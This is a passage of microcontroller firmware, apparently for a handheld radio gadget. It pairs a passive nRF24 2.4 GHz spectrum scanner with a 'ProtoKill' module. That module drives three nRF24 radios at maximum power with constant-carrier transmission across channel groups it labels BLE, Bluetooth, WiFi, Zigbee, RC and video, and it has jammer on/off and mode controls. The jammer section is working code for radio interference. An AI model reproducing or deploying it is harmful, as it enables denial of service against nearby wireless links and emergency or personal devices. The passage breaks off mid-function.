    scannerWaitNavRelease(BTN_RIGHT);
  }
}

static void scannerPollNavButtons() {
  maintainTouchNavBar();
  // Remapped layout: LEFT exits now (was SELECT via featureExitButtonPressed()).
  if (feature_active && (feature_exit_requested || isButtonPressed(BTN_LEFT))) {
    feature_exit_requested = true;
    scanning = false;
    return;
  }
  scannerHandleNavButtons();
}

void calibrateBackgroundNoise() {

  Print("[!] Calibrating noise floor...", UI_TEXT, false);

  for (int i = 0; i < 2; i++) {
    disable();
    for (int j = 0; j < 50; j++) {
      for (int i = 0; i < CHANNELS; i++) {
        if ((i % BUTTON_POLL_STRIDE) == 0) {
          scannerPollNavButtons();
        }

        setRegister(_NRF24_RF_CH, (uint8_t)i);
        enable();
        delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
        disable();
        if (carrierDetected()) channel[i]++;
      }
    }
    for (int j = 0; j < CHANNELS; j++) {
      backgroundNoise[j] += channel[j];

    }
  }

  int maxNoiseCh = 0;
  int maxNoise = 0;
  for (int i = 0; i < CHANNELS; i++) {
    backgroundNoise[i] /= 5;
    if (backgroundNoise[i] > maxNoise) {
      maxNoise = backgroundNoise[i];
      maxNoiseCh = i;
    }
  }

  Print("[+] Calibrate done  Ch" + String(maxNoiseCh) + " " + scannerChannelGHzText(maxNoiseCh) + "GHz", UI_WARN, false);
}

void scan() {
  Print("[!] Scan refresh...", UI_TEXT, false);
  memset(channel, 0, sizeof(channel));
  disable();
  for (int j = 0; j < 50; j++) {
    for (int i = 0; i < CHANNELS; i++) {
      if ((i % BUTTON_POLL_STRIDE) == 0) {
        scannerPollNavButtons();
      }

      setRegister(_NRF24_RF_CH, (uint8_t)i);
      enable();
      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) channel[i]++;
    }
  }

  int peakCh = 0;
  int peakHits = 0;
  int active = 0;
  for (int i = 0; i < CHANNELS; i++) {
    if (channel[i] > 0) {
      active++;
    }
    if (channel[i] > peakHits) {
      peakHits = channel[i];
      peakCh = i;
    }
  }
  if (peakHits > 0) {
    Print("[+] Scan done  " + String(active) + " hit(s)  peak Ch" + String(peakCh), UI_WARN, false);
  } else {
    Print("[*] Scan done  no carriers", UI_DIM_TEXT, false);
  }
}

void runUI() {
#define SCREEN_WIDTH  240
#define SCREEN_HEIGHT 320
#define STATUS_BAR_Y_OFFSET 20
#define STATUS_BAR_HEIGHT 16
#define ICON_SIZE 16
#define ICON_NUM 3

  static int iconX[ICON_NUM] = {170, 210, 10};
  static int iconY = STATUS_BAR_Y_OFFSET;

  static const unsigned char* icons[ICON_NUM] = {
    bitmap_icon_undo,
    bitmap_icon_start,
    bitmap_icon_go_back
  };

  if (!uiDrawn) {

    tft.fillRect(0, 20, 160, 16, DARK_GRAY);
    tft.setTextColor(UI_TEXT, DARK_GRAY);
    tft.setCursor(35, 24);
    tft.print("2.4GHz Scanner");

    tft.drawFastHLine(0, 19, 240, UI_LINE);
    tft.fillRect(160, STATUS_BAR_Y_OFFSET, SCREEN_WIDTH, STATUS_BAR_HEIGHT, DARK_GRAY);

    for (int i = 0; i < ICON_NUM; i++) {
      if (icons[i] != NULL) {
        tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, UI_ICON);
      }
    }
    tft.drawFastHLine(0, STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT, SCREEN_WIDTH, UI_LINE);
    uiDrawn = true;
  }

  static unsigned long lastAnimationTime = 0;
  static int animationState = 0;
  static int activeIcon = -1;

  if (animationState > 0 && millis() - lastAnimationTime >= 150) {
    if (animationState == 1) {
      tft.drawBitmap(iconX[activeIcon], iconY, icons[activeIcon], ICON_SIZE, ICON_SIZE, UI_ICON);
      animationState = 2;

      switch (activeIcon) {
        case 0: calibrateBackgroundNoise(); break;
        case 1: scan(); break;
      }
    } else if (animationState == 2) {
      animationState = 0;
      activeIcon = -1;
    }
    lastAnimationTime = millis();
  }

  static unsigned long lastTouchCheck = 0;
  const unsigned long touchCheckInterval = 50;

  if (millis() - lastTouchCheck >= touchCheckInterval) {
    int x, y;
    if (feature_active && readTouchXY(x, y)) {
      if (y > STATUS_BAR_Y_OFFSET && y < STATUS_BAR_Y_OFFSET + STATUS_BAR_HEIGHT) {
        for (int i = 0; i < ICON_NUM; i++) {
          if (x > iconX[i] && x < iconX[i] + ICON_SIZE) {
            if (icons[i] != NULL && animationState == 0) {

              if (i == 2) {
                feature_exit_requested = true;

                scanning = false;
              } else {

                tft.drawBitmap(iconX[i], iconY, icons[i], ICON_SIZE, ICON_SIZE, TFT_BLACK);
                animationState = 1;
                activeIcon = i;
                lastAnimationTime = millis();
              }
            }
            break;
          }
        }
      }
    }
    lastTouchCheck = millis();
  }
}

void scanChannels() {
  disable();
  static uint32_t lastUI = 0;
  for (int j = 0; j < (int)SCAN_SWEEPS && scanning; j++) {
    for (int i = 0; i < CHANNELS && scanning; i++) {

      // Remapped layout: LEFT exits now (was SELECT via isSelectButtonPressed()/
      // featureExitButtonPressed() -- merged into one check).
      if ((i % BUTTON_POLL_STRIDE) == 0 && (feature_exit_requested || isExitButtonPressed())) {
        scanning = false;
        Print("Scan interrupted by user", UI_WARN, true);
        return;
      }

      setRegister(_NRF24_RF_CH, (uint8_t)i);
      enable();
      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) channel[i]++;

      uint32_t now = millis();
      if (now - lastUI >= UI_THROTTLE_MS) {
        runUI();
        scannerPollNavButtons();
        lastUI = now;
        delay(0);
        if (feature_exit_requested || isExitButtonPressed()) {
          scanning = false;
          return;
        }
      } else if ((i % BUTTON_POLL_STRIDE) == 0) {
        scannerPollNavButtons();
      }
    }
  }
}

void outputChannels() {
  int norm = 0;
  for (int i = 0; i < CHANNELS && scanning; i++) {
    if (channel[i] > norm) norm = channel[i];
  }
  static uint32_t lastUI = 0;
  for (int i = 0; i < CHANNELS && scanning; i++) {
    // Remapped layout: LEFT exits now (was SELECT via isSelectButtonPressed()).
    if ((i % BUTTON_POLL_STRIDE) == 0 && (feature_exit_requested || isExitButtonPressed())) {
      scanning = false;
      Print("Output interrupted by user", UI_WARN, true);
      return;
    }
    int strength = (norm != 0) ? (channel[i] * 10) / norm : 0;
    (void)strength;
    channel[i] = 0;
    uint32_t now = millis();
    if (now - lastUI >= UI_THROTTLE_MS) {
      runUI();
      scannerPollNavButtons();
      lastUI = now;
      delay(0);
    } else if ((i % BUTTON_POLL_STRIDE) == 0) {
      scannerPollNavButtons();
    }
  }
}

struct ScannerPlotLayout {
  int graphTop = 0;
  int axisX = 10;
  int plotRight = 0;
  int plotTop = 0;
  int plotBottom = 0;
  int plotHeight = 0;
  int plotWidth = 0;
  int maxBarHeight = 0;
  bool valid = false;
};

static ScannerPlotLayout s_plot;
static uint8_t s_smoothValues[N];
static uint8_t s_prevBarPx[N];
static bool s_graphChromeDrawn = false;
static int s_lastPeakCh = -1;
static uint8_t s_lastPeakVal = 0;
static int s_peakMarkerX = -1;
static int s_statusPeakCh = -1;
static uint8_t s_statusPeakVal = 0;
static int s_statusActive = -1;
static int s_statusPctBucket = -1;
static uint32_t s_lastStatusDrawMs = 0;
static String s_statusLineText[kScannerStatusLineCount];
static uint16_t s_statusLineColor[kScannerStatusLineCount];
static bool s_statusStaticDrawn = false;


static int scannerBarCol0X() {
  const int barsSpan = (kScannerBarsPerCol * 2) + kScannerBarColGap;
  return s_plot.axisX + max(0, (s_plot.plotWidth - barsSpan) / 2);
}

static int scannerBarX(int ch) {
  const int col0 = scannerBarCol0X();
  if (ch < kScannerBarsPerCol) {
    return col0 + ch;
  }
  return col0 + kScannerBarsPerCol + kScannerBarColGap + (ch - kScannerBarsPerCol);
}

static constexpr int kScannerGridDivisions = 4;
static constexpr int kScannerMinBarPx = 5;

static int scannerHorizGridY(int lineIndex) {
  return s_plot.plotTop + ((s_plot.plotHeight * lineIndex) + (kScannerGridDivisions / 2)) / kScannerGridDivisions;
}

static void scannerDrawHorizGridLines() {
  for (int g = 1; g < kScannerGridDivisions; g++) {
    const int gy = scannerHorizGridY(g);
    tft.drawFastHLine(s_plot.axisX + 1, gy, s_plot.plotWidth - 2, 0x2945);
  }
}

static void scannerDrawVertGridLines() {
  for (int v = 1; v < kScannerGridDivisions; v++) {
    const int vx = s_plot.axisX + ((s_plot.plotWidth * v) + (kScannerGridDivisions / 2)) / kScannerGridDivisions;
    tft.drawFastVLine(vx, s_plot.plotTop + 1, s_plot.plotHeight - 2, 0x2945);
  }
}

static void scannerResetGraphState() {
  s_graphChromeDrawn = false;
  s_plot.valid = false;
  memset(s_smoothValues, 0, sizeof(s_smoothValues));
  memset(s_prevBarPx, 0, sizeof(s_prevBarPx));
  memset(values, 0, sizeof(values));
  s_lastPeakCh = -1;
  s_lastPeakVal = 0;
  s_peakMarkerX = -1;
  s_statusPeakCh = -1;
  s_statusPeakVal = 0;
  s_statusActive = -1;
  s_statusPctBucket = -1;
  s_lastStatusDrawMs = 0;
  s_statusStaticDrawn = false;
  for (int i = 0; i < kScannerStatusLineCount; i++) {
    s_statusLineText[i] = "";
    s_statusLineColor[i] = 0;
  }
}

static void scannerRestoreColumnDecor(int x) {
  if (!s_plot.valid) {
    return;
  }
  for (int g = 1; g < kScannerGridDivisions; g++) {
    const int gy = scannerHorizGridY(g);
    if (gy > s_plot.plotTop && gy < s_plot.plotBottom) {
      tft.drawPixel(x, gy, 0x2945);
    }
  }
  for (int v = 1; v < kScannerGridDivisions; v++) {
    const int vx = s_plot.axisX + ((s_plot.plotWidth * v) + (kScannerGridDivisions / 2)) / kScannerGridDivisions;
    if (vx == x) {
      tft.drawFastVLine(vx, s_plot.plotTop + 1, s_plot.plotHeight - 2, 0x2945);
      break;
    }
  }
}

static void scannerEnsurePlotLayout() {
  const int screenW = tft.width();
  s_plot.graphTop = kScannerGraphTop;
  s_plot.axisX = kScannerGraphMarginX;
  s_plot.plotRight = screenW - kScannerGraphMarginX;
  s_plot.plotTop = s_plot.graphTop + 12;
  s_plot.plotBottom = bleContentBottom() - 13;
  s_plot.plotHeight = s_plot.plotBottom - s_plot.plotTop;
  s_plot.plotWidth = s_plot.plotRight - s_plot.axisX;
  s_plot.maxBarHeight = s_plot.plotHeight;
  s_plot.valid = s_plot.plotWidth >= 32 && s_plot.plotHeight >= 10;
}

static void scannerDrawGraphChrome() {
  scannerEnsurePlotLayout();
  if (!s_plot.valid) {
    return;
  }

  const int screenW = tft.width();
  const int graphBottom = bleContentBottom() - 2;
  tft.fillRect(0, kScannerLogBottom, screenW, graphBottom - kScannerLogBottom + 2, TFT_BLACK);
  tft.fillRect(s_plot.axisX, s_plot.plotTop, s_plot.plotWidth, s_plot.plotHeight, 0x0842);

  scannerDrawHorizGridLines();
  scannerDrawVertGridLines();

  tft.drawRect(s_plot.axisX, s_plot.plotTop, s_plot.plotWidth, s_plot.plotHeight, UI_LINE);
  tft.drawLine(s_plot.axisX, s_plot.plotTop, s_plot.axisX, s_plot.plotBottom, WHITE);
  tft.drawLine(s_plot.axisX, s_plot.plotBottom, s_plot.plotRight, s_plot.plotBottom, WHITE);

  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.drawString("2.4 GHz Spectrum", (screenW - 96) / 2, s_plot.graphTop + 2);

  const int labelY = s_plot.plotBottom + 2;
  const int endMhz = 2400 + N - 1;
  char lo[8], mid[8], hi[8];
  snprintf(lo, sizeof(lo), "2.40");
  snprintf(mid, sizeof(mid), "2.%02u", (unsigned)((2400 + N / 2) % 100));
  snprintf(hi, sizeof(hi), "2.%02u", (unsigned)(endMhz % 100));
  tft.drawString(lo, s_plot.axisX + 2, labelY);
  tft.drawString(mid, s_plot.axisX + s_plot.plotWidth / 2 - 8, labelY);
  tft.drawString(hi, s_plot.plotRight - 24, labelY);

  s_graphChromeDrawn = true;
  memset(s_prevBarPx, 0, sizeof(s_prevBarPx));
  s_lastPeakCh = -1;
  s_lastPeakVal = 0;
  s_peakMarkerX = -1;
}

static void scannerFindPeak(const uint8_t* vals, int count, int& peakCh, uint8_t& peakVal) {
  peakCh = 0;
  peakVal = 0;
  for (int i = 0; i < count; i++) {
    if (vals[i] > peakVal) {
      peakVal = vals[i];
      peakCh = i;
    }
  }
}

static String scannerChannelGHzText(int ch) {
  const uint16_t mhz = (uint16_t)(2400 + ch);
  char buf[10];
  snprintf(buf, sizeof(buf), "%u.%03u", mhz / 1000, mhz % 1000);
  return String(buf);
}

static String scannerBandHint(int ch) {
  if (ch == 2 || ch == 26 || ch == 80) {
    return "BLE";
  }
  if (ch >= 10 && ch <= 15) {
    return "WiFi Ch1";
  }
  if (ch >= 34 && ch <= 40) {
    return "WiFi Ch6";
  }
  if (ch >= 59 && ch <= 65) {
    return "WiFi Ch11";
  }
  if (ch >= 76 && ch <= 86) {
    return "RC/Video";
  }
  return "ISM";
}

static String scannerChannelBandLine(int ch) {
  return "Ch " + String(ch) + "  " + scannerBandHint(ch);
}

static String scannerFitStatusText(const String& text) {
  const int maxWidth = tft.width() - 16;
  tft.setTextSize(1);
  if (tft.textWidth(text) <= maxWidth) {
    return text;
  }
  String out = text;
  while (out.length() > 1 && tft.textWidth(out + "...") > maxWidth) {
    out.remove(out.length() - 1);
  }
  if (!out.isEmpty()) {
    out += "...";
  }
  return out;
}

static int scannerCountActiveChannels(const uint8_t* vals, int count) {
  int active = 0;
  for (int i = 0; i < count; i++) {
    if (vals[i] >= 3) {
      active++;
    }
  }
  return active;
}

static void scannerDrawStatusLine(int line, const String& text, uint16_t color) {
  const int y = kScannerStatusTextY + line * LINE_HEIGHT;
  const String fitted = scannerFitStatusText(text);
  tft.fillRect(8, y, tft.width() - 16, LINE_HEIGHT, TFT_BLACK);
  tft.setTextSize(1);
  tft.setTextColor(color, TFT_BLACK);
  tft.setCursor(8, y);
  tft.print(fitted);
}

static void scannerDrawStatusLineIfChanged(int line, const String& text, uint16_t color) {
  if (line < 0 || line >= kScannerStatusLineCount) {
    return;
  }
  if (s_statusLineText[line] == text && s_statusLineColor[line] == color) {
    return;
  }
  s_statusLineText[line] = text;
  s_statusLineColor[line] = color;
  scannerDrawStatusLine(line, text, color);
}

static void scannerDrawTextBoxes() {
  tft.fillRect(0, kScannerStatusY - 2, tft.width(), kScannerLogBottom - kScannerStatusY + 2, TFT_BLACK);
  tft.drawFastHLine(0, 19, tft.width(), UI_LINE);
  tft.drawRoundRect(4, kScannerStatusY, tft.width() - 8, kScannerStatusBoxH, 3, UI_LINE);
  tft.drawRoundRect(4, kScannerLogBoxTop, tft.width() - 8, kScannerLogBoxH, 3, UI_LINE);
  tft.setTextSize(1);
  tft.setTextColor(UI_DIM_TEXT, TFT_BLACK);
  tft.drawString("RF Status", 8, kScannerStatusY + 3);
  tft.drawString("Activity", 8, kScannerLogBoxTop + 3);
}

static void scannerDrawStaticStatusLines() {
  if (s_statusStaticDrawn) {
    return;
  }
  char rangeLine[40];
  snprintf(rangeLine, sizeof(rangeLine), "Range: 2.4-2.528 GHz  %d ch", N);
  scannerDrawStatusLineIfChanged(4, rangeLine, UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(5, "State: Monitoring", UI_DIM_TEXT);
  s_statusStaticDrawn = true;
}

static void scannerUpdateStatusPanel(const uint8_t* vals, int count) {
  int peakCh = 0;
  uint8_t peakVal = 0;
  scannerFindPeak(vals, count, peakCh, peakVal);
  const int active = scannerCountActiveChannels(vals, count);

  const int pct = peakVal > 0 ? min(100, ((int)peakVal * 100) / 64) : 0;
  const int pctBucket = pct / 3;
  const uint32_t now = millis();
  if (peakCh == s_statusPeakCh && pctBucket == s_statusPctBucket &&
      active == s_statusActive && now - s_lastStatusDrawMs < 200) {
    return;
  }
  s_statusPeakCh = peakCh;
  s_statusPeakVal = peakVal;
  s_statusActive = active;
  s_statusPctBucket = pctBucket;
  s_lastStatusDrawMs = now;

  scannerDrawStaticStatusLines();

  if (peakVal == 0) {
    scannerDrawStatusLineIfChanged(0, "Peak: none", UI_DIM_TEXT);
    scannerDrawStatusLineIfChanged(1, "Ch --  --", UI_DIM_TEXT);
    scannerDrawStatusLineIfChanged(2, "Strength: 0%", UI_DIM_TEXT);
  } else {
    scannerDrawStatusLineIfChanged(0, "Peak: " + scannerChannelGHzText(peakCh) + " GHz", UI_TEXT);
    scannerDrawStatusLineIfChanged(1, scannerChannelBandLine(peakCh), UI_TEXT);
    scannerDrawStatusLineIfChanged(2, "Strength: " + String(pct) + "%", UI_TEXT);
  }

  scannerDrawStatusLineIfChanged(3, "Active: " + String(active) + " channel(s)", active > 0 ? UI_OK : UI_DIM_TEXT);
}

static void scannerClearPeakMarker() {
  if (!s_plot.valid || s_peakMarkerX < 0) {
    return;
  }
  tft.drawPixel(s_peakMarkerX, s_plot.plotTop + 1, 0x0842);
  s_peakMarkerX = -1;
}

static void scannerUpdatePeakMarker(const uint8_t* vals, int count) {
  if (!s_plot.valid) {
    return;
  }

  int peakCh = 0;
  uint8_t peakVal = 0;
  scannerFindPeak(vals, count, peakCh, peakVal);

  if (peakCh == s_lastPeakCh && peakVal == s_lastPeakVal) {
    return;
  }
  s_lastPeakCh = peakCh;
  s_lastPeakVal = peakVal;

  scannerClearPeakMarker();
  if (peakVal == 0) {
    return;
  }

  const int markerX = scannerBarX(peakCh);
  tft.drawPixel(markerX, s_plot.plotTop + 1, WHITE);
  s_peakMarkerX = markerX;
}

static void scannerUpdateBarColumn(int ch, int newPx, int oldPx) {
  if (!s_plot.valid) {
    return;
  }
  const int x = scannerBarX(ch);
  const uint16_t bg = 0x0842;

  if (newPx < oldPx) {
    tft.fillRect(x, s_plot.plotBottom - oldPx, 1, oldPx - newPx, bg);
    scannerRestoreColumnDecor(x);
  }
  if (newPx > oldPx) {
    tft.fillRect(x, s_plot.plotBottom - newPx, 1, newPx - oldPx, UI_WARN);
  }
  s_prevBarPx[ch] = (uint8_t)newPx;
}

static void scannerSmoothFrame(const uint8_t* frameHits, int count) {
  for (int i = 0; i < count; i++) {
    if (frameHits[i] > 0) {
      int blended = (((int)s_smoothValues[i] * 3) + ((int)frameHits[i] * 5)) / 8;
      if (blended < (int)frameHits[i]) {
        blended = frameHits[i];
      }
      s_smoothValues[i] = (uint8_t)min(255, blended);
    } else if (s_smoothValues[i] > 2) {
      s_smoothValues[i] = (uint8_t)(((int)s_smoothValues[i] * 7) / 8);
    } else if (s_smoothValues[i] > 0) {
      s_smoothValues[i]--;
    }
  }
}

static int scannerValueToBarPx(uint8_t val, uint8_t peakVal) {
  if (val == 0 || !s_plot.valid || s_plot.maxBarHeight <= 0) {
    return 0;
  }

  const int maxH = s_plot.maxBarHeight;
  if (peakVal == 0 || val >= peakVal) {
    return min(maxH, max(kScannerMinBarPx, (int)val));
  }

  const int span = maxH - kScannerMinBarPx;
  int scaled = kScannerMinBarPx + (span * (int)val) / (int)peakVal;
  return min(maxH, max(kScannerMinBarPx, scaled));
}

static void scannerUpdateBars(const uint8_t* vals, int count) {
  if (!s_graphChromeDrawn) {
    scannerDrawGraphChrome();
  }
  if (!s_plot.valid) {
    return;
  }

  int peakCh = 0;
  uint8_t peakVal = 0;
  scannerFindPeak(vals, count, peakCh, peakVal);

  for (int i = 0; i < count; i++) {
    const int newPx = scannerValueToBarPx(vals[i], peakVal);
    const int oldPx = s_prevBarPx[i];
    if (newPx != oldPx) {
      scannerUpdateBarColumn(i, newPx, oldPx);
    }
  }
}

void display() {
  if (!scanning) {
    return;
  }

  uint8_t frameHits[N];
  memset(frameHits, 0, sizeof(frameHits));

  disable();
  static uint32_t lastNavPoll = 0;
  for (int pass = 0; pass < (int)DISPLAY_SWEEPS && scanning; ++pass) {
    for (int i = 0; i < N && scanning; ++i) {
      // Remapped layout: LEFT exits now (was SELECT via isSelectButtonPressed()/
      // featureExitButtonPressed() -- merged into one check).
      if ((i % BUTTON_POLL_STRIDE) == 0 && (feature_exit_requested || isExitButtonPressed())) {
        scanning = false;
        Print("Display interrupted by user", UI_WARN, true);
        return;
      }

      setRegister(_NRF24_RF_CH, (uint8_t)i);
      enable();
      delayMicroseconds(RX_SETTLE_US + RPD_DWELL_US);
      disable();
      if (carrierDetected()) {
        frameHits[i]++;
      }

      const uint32_t now = millis();
      if (now - lastNavPoll >= UI_THROTTLE_MS) {
        scannerPollNavButtons();
        lastNavPoll = now;
      } else if ((i % BUTTON_POLL_STRIDE) == 0) {
        scannerPollNavButtons();
      }
    }
  }

  scannerSmoothFrame(frameHits, N);
  scannerUpdateBars(s_smoothValues, N);
  scannerUpdatePeakMarker(s_smoothValues, N);
  scannerUpdateStatusPanel(s_smoothValues, N);
}

void scannerSetup() {
  setTouchButtonInputEnabled(true);
  bleSetScannerNavLabels();
  bleClearBody(TFT_BLACK);

  float currentBatteryVoltage = readBatteryVoltage();
  drawStatusBar(currentBatteryVoltage, true);
  redrawTouchButtonBar();

  uiDrawn = false;
  scannerResetGraphState();
  scannerDrawGraphChrome();

  setupTouchscreen();

  scannerDrawTextBoxes();
  scannerDrawStatusLineIfChanged(0, "Peak: scanning...", UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(1, "Ch --  --", UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(2, "Strength: --", UI_DIM_TEXT);
  scannerDrawStatusLineIfChanged(3, "Active: 0 channel(s)", UI_DIM_TEXT);
  scannerDrawStaticStatusLines();
  Print("[+] Scanner ready", UI_WARN, false);
  redrawTouchButtonBar();

  SPI.begin(NRF24_SPI_SCK, NRF24_SPI_MISO, NRF24_SPI_MOSI, NRF24_SPI_SS);
  SPI.setDataMode(SPI_MODE0);
  SPI.setFrequency(10000000);
  SPI.setBitOrder(MSBFIRST);

  pinMode(CE, OUTPUT);
  pinMode(CSN, OUTPUT);

  disable();
  powerUp();

  setRegister(_NRF24_CONFIG, getRegister(_NRF24_CONFIG) | 0x03);
  delayMicroseconds(130);
  setRegister(_NRF24_EN_AA, 0x0);
  setRegister(_NRF24_RF_SETUP, 0x0F);

  scanning = true;
}

void scannerLoop() {
  scanning = true;
  while (scanning) {

    // Remapped layout: LEFT exits now (was SELECT via featureExitButtonPressed()).
    if (feature_active && (feature_exit_requested || isButtonPressed(BTN_LEFT))) {
      feature_exit_requested = true;
      scanning = false;
      break;
    }

    scannerPollNavButtons();
    runUI();
    scanChannels();
    outputChannels();
    display();
    delay(2);
  }
}

void exit() {
  // Fully release the nRF24 so it stops holding the shared SPI bus and drawing
  // RX current after the user leaves the feature.
  scanning = false;
  disable();    // CE low: leave RX mode
  powerDown();  // clear PWR_UP in CONFIG
  digitalWrite(CSN, HIGH);

  // Scanner remaps SPI (SCK/MISO swapped vs SD on DIV V2). Remount SD on the
  // default shared bus so later features see a working card.
  restoreSdAfterSharedSpi();
}

}  // namespace Scanner

namespace ProtoKill {

RF24 radio1(CE_PIN_1, CSN_PIN_1, 16000000);
RF24 radio2(CE_PIN_2, CSN_PIN_2, 16000000);
RF24 radio3(CE_PIN_3, CSN_PIN_3, 16000000);

enum OperationMode { BLE_MODULE, Bluetooth_MODULE, WiFi_MODULE, VIDEO_TX_MODULE, RC_MODULE, USB_WIRELESS_MODULE, ZIGBEE_MODULE, NRF24_MODULE };
OperationMode currentMode = WiFi_MODULE;

bool jammerActive = false;

const byte bluetooth_channels[] =        {32, 34, 46, 48, 50, 52, 0, 1, 2, 4, 6, 8, 22, 24, 26, 28, 30, 74, 76, 78, 80};
const byte ble_channels[] =              {2, 26, 80};
const byte WiFi_channels[] =             {1, 2, 3, 4, 5, 6, 7, 8, 9, 10, 11, 12};
const byte usbWireless_channels[] =      {40, 50, 60};
const byte videoTransmitter_channels[] = {70, 75, 80};
const byte rc_channels[] =               {1, 3, 5, 7};
const byte zigbee_channels[] =           {11, 15, 20, 25};
const byte nrf24_channels[] =            {76, 78, 79};

const byte BLE_channels[] = {2, 26, 80};
byte channelGroup1[] = {2, 5, 8, 11};
byte channelGroup2[] = {26, 29, 32, 35};
byte channelGroup3[] = {80, 83, 86, 89};

#define SCREEN_HEIGHT 320
#define LINE_HEIGHT 12
#define MAX_LINES (SCREEN_HEIGHT / LINE_HEIGHT)

String Buffer[MAX_LINES];
uint16_t Buffercolor[MAX_LINES];
int Index = 0;

volatile bool modeChangeRequested = false;
volatile bool modeChangeRequested1 = false;
volatile bool jammerToggleRequested = false;

static constexpr int kProkillLogTop = 48;

static int prokillVisibleLines() {
  return bleMaxLinesInZone(kProkillLogTop, LINE_HEIGHT);
}

static bool prokillLineFits(int yPos) {
  return yPos + LINE_HEIGHT <= bleContentBottom();
}

static void prokillRedrawLogLine(int bufIndex) {
  const int visibleLines = prokillVisibleLines();
  if (bufIndex < 0 || bufIndex >= visibleLines) {
    return;
  }
  const int yPos = (bufIndex * LINE_HEIGHT) + kProkillLogTop;
  if (!prokillLineFits(yPos)) {
    return;
  }

  tft.fillRect(5, yPos, tft.width() - 10, LINE_HEIGHT, TFT_BLACK);
  tft.setTextColor(Buffercolor[bufIndex], TFT_BLACK);
  tft.setCursor(5, yPos);
  tft.print(Buffer[bufIndex]);
}

static void prokillRedrawAllLog() {
  const int visibleLines = prokillVisibleLines();
  for (int i = 0; i < Index && i < visibleLines; i++) {
    prokillRedrawLogLine(i);
  }
}

void Print(String text, uint16_t color, bool extraSpace = false) {
  const int visibleLines = prokillVisibleLines();
  const bool scrolled = (Index >= visibleLines);
  if (scrolled) {
    for (int i = 0; i < visibleLines - 1; i++) {
      Buffer[i] = Buffer[i + 1];
      Buffercolor[i] = Buffercolor[i + 1];
    }
    Index = visibleLines - 1;
  }

  const int firstNewIndex = Index;
  Buffer[Index] = text;
  Buffercolor[Index] = color;
  Index++;

  if (extraSpace && Index < visibleLines) {
    Buffer[Index] = "";
    Buffercolor[Index] = WHITE;
    Index++;
  }

  if (scrolled) {
    prokillRedrawAllLog();
    return;
  }

  for (int i = firstNewIndex; i < Index; i++) {
    prokillRedrawLogLine(i);
  }
}

void prokillHandleNavButtons() {
  if (!featureHasTouchNavBar()) {
    return;
  }

  // Remapped layout: SELECT toggles on/off (was UP -- the most important
  // action), UP=Mode- (was LEFT), DOWN=Mode+ (was RIGHT; Prev/Next-style
  // pairs always sit on UP/DOWN). LEFT is the universal Exit, handled in
  // prokillLoop().
  if (isButtonPressedEdge(BTN_SELECT)) {
    jammerToggleRequested = true;
    bleWaitButtonRelease(BTN_SELECT);
  }
  if (isButtonPressedEdge(BTN_DOWN)) {
    modeChangeRequested = true;
    bleWaitButtonRelease(BTN_DOWN);
  }
  if (isButtonPressedEdge(BTN_UP)) {
    modeChangeRequested1 = true;
    bleWaitButtonRelease(BTN_UP);
  }
}

void configureRadio(RF24 &radio, const byte* channels, size_t size) {
  radio.setAutoAck(false);
  radio.stopListening();
  radio.setRetries(0, 0);
  radio.setPALevel(RF24_PA_MAX, true);
  radio.setDataRate(RF24_2MBPS);
  radio.setCRCLength(RF24_CRC_DISABLED);

  for (size_t i = 0; i < size; i++) {
    radio.setChannel(channels[i]);
    radio.startConstCarrier(RF24_PA_MAX, channels[i]);
  }
}

void initializeRadiosMultiMode() {
  bool radio1Active = false;
  bool radio2Active = false;
  bool radio3Active = false;

  if (radio1.begin()) {
    configureRadio(radio1, channelGroup1, sizeof(channelGroup1));
    radio1Active = true;
  }
  if (radio2.begin()) {
    configureRadio(radio2, channelGroup2, sizeof(channelGroup2));
    radio2Active = true;
  }
  if (radio3.begin()) {
    configureRadio(radio3, channelGroup3, sizeof(channelGroup3));
    radio3Active = true;
  }
}

void initializeRadios() {
  if (jammerActive) {
    initializeRadiosMultiMode();

  } else {
    radio1.powerDown();
    radio2.powerDown();
    radio3.powerDown();
  }
}

void updateTFT() {
  tft.fillRect(0, 19, 240, 16, DARK_GRAY);

  tft.setTextSize(1);

  // Remapped layout: LEFT=Exit, SELECT=Toggle on/off (was UP; no SELECT icon
  // bitmap exists in this firmware, so its state is shown as plain status
  // text -- the touch nav bar's center "Toggle" label already names the
  // button), UP=Mode- (was LEFT), DOWN=Mode+ (was RIGHT).
  tft.setTextColor(jammerActive ? UI_OK : UI_TEXT, DARK_GRAY);
  tft.setCursor(20, 23);
  tft.print(jammerActive ? "[ON]" : "[OFF]");

  tft.drawFastVLine(102, 22, 12, LIGHT_GRAY);
  tft.drawBitmap(110, 19, bitmap_icon_UP, 16, 16, UI_ICON);
  tft.setTextColor(UI_TEXT, DARK_GRAY);
  tft.setCursor(128, 23);
  tft.print("MODE-");

  tft.drawFastVLine(178, 22, 12, LIGHT_GRAY);
  tft.drawBitmap(186, 19, bitmap_icon_DOWN, 16, 16, UI_ICON);
  tft.setTextColor(UI_TEXT, DARK_GRAY);
  tft.setCursor(204, 23);
  tft.print("+");

  tft.drawFastHLine(0, 19, 240, UI_LINE);
  tft.drawFastHLine(0, 35, 240, UI_LINE);

}

void printModeChange(OperationMode mode) {
  String modeText = "[+] Mode changed to: ";
  switch (mode) {
    case BLE_MODULE:          modeText += "BLE";       break;
    case Bluetooth_MODULE:    modeText += "Bluetooth"; break;
    case WiFi_MODULE:         modeText += "WIFI";      break;
    case USB_WIRELESS_MODULE: modeText += "USB";       break;
    case VIDEO_TX_MODULE:     modeText += "Video";     break;
    case RC_MODULE:           modeText += "RC";        break;
    case ZIGBEE_MODULE:       modeText += "ZIGBEE";    break;
    case NRF24_MODULE:        modeText += "NRF24";     break;
    default: modeText                  += "Unknown";   break;
  }
  Print(modeText, UI_TEXT, false);
}

void printJammerStatus(bool active) {
  String jammerText = "[!] Jammer ";
  jammerText += active ? "Activated" : "Deactivated";
  Print(jammerText, UI_WARN, false);
}

void checkModeChange() {
  prokillHandleNavButtons();

  if (modeChangeRequested) {
    modeChangeRequested = false;
    currentMode = static_cast<OperationMode>((currentMode + 1) % 8);
